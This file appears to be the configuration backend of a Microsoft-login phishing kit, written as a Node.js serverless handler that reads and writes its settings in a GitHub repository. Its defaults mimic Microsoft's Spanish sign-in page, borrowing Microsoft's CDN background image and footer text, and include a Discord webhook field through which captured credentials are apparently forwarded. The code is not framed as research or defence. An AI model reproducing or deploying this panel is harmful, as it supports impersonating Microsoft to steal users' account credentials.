import { Buffer } from 'node:buffer';

const GH_TOKEN    = process.env.GH_TOKEN    || '';
const GH_OWNER    = process.env.GH_OWNER    || 'varasjaime777-alt';
const GH_REPO     = process.env.GH_REPO     || 'mail-officee-3656';
const CONFIG_PATH = 'config.json';
const GITHUB_API  = `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${CONFIG_PATH}`;
const HEADERS     = {
  'Authorization': `token ${GH_TOKEN}`,
  'Accept':        'application/vnd.github.v3+json',
  'User-Agent':    'mail-officee-3656-panel/1.0',
};

async function githubGet() {
  const res = await fetch(GITHUB_API, { method:'GET', headers: HEADERS });
  if (!res.ok) throw new Error(`GitHub GET ${res.status}`);
  const data = await res.json();
  return JSON.parse(Buffer.from(data.content, 'base64').toString('utf-8'));
}

async function githubPut(contentStr) {
  let sha = '';
  try {
    const r = await fetch(GITHUB_API, { method:'GET', headers: HEADERS });
    if (r.ok) { const d = await r.json(); sha = d.sha || ''; }
  } catch(e) { /* archivo no existe aún */ }

  const base64 = Buffer.from(contentStr, 'utf-8').toString('base64');
  const body = {
    message: 'Actualización automática de config',
    content: base64,
    sha: sha || undefined,
  };
  const res = await fetch(GITHUB_API, {
    method: 'PUT', headers: HEADERS,
    body: JSON.stringify(body),
  });
  if (!res.ok) throw new Error(`GitHub PUT ${res.status}`);
  return await res.json();
}

export default async function handler(req, res) {
  const method = req.method;

  if (method === 'GET') {
    try {
      const config = await githubGet();
      return res.status(200).json({ success: true, config });
    } catch(e) {
      return res.status(200).json({
        success: true,
        config: {
          discordWebhook: '',
          discordMessageTemplate: '',
          appTitle: 'Iniciar sesión en su cuenta',
          appSubtitle: 'Use su cuenta de Microsoft.',
          loginBgType: 'image',
          loginBgColor: '#0a0a1a',
          loginBgGradient: 'linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)',
          loginBgImage: 'https://logincdn.msftauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg',
          footerHelpText: 'Ayuda',
          footerTermsText: 'Términos de uso',
          footerPrivacyText: 'Privacidad y cookies',
          footerNoteText: 'Usa la exploración privada si este no es tu dispositivo. Más información',
        },
        note: 'usando configuración por defecto (GitHub no disponible)',
      });
    }
  }

  if (method === 'PATCH' || method === 'PUT') {
    try {
      let body = {};
      try { body = typeof req.body === 'string' ? JSON.parse(req.body) : (req.body || {}); }
      catch(e) { body = req.body || {}; }

      let current = {};
      try { current = await githubGet(); } catch(e) { current = {}; }

      const merged = { ...current, ...body };
      const jsonStr = JSON.stringify(merged, null, 2);
      await githubPut(jsonStr);

      return res.status(200).json({ success: true, config: merged });
    } catch(e) {
      return res.status(500).json({ success: false, error: e.message });
    }
  }

  return res.status(405).json({ error: 'Método no permitido' });
}
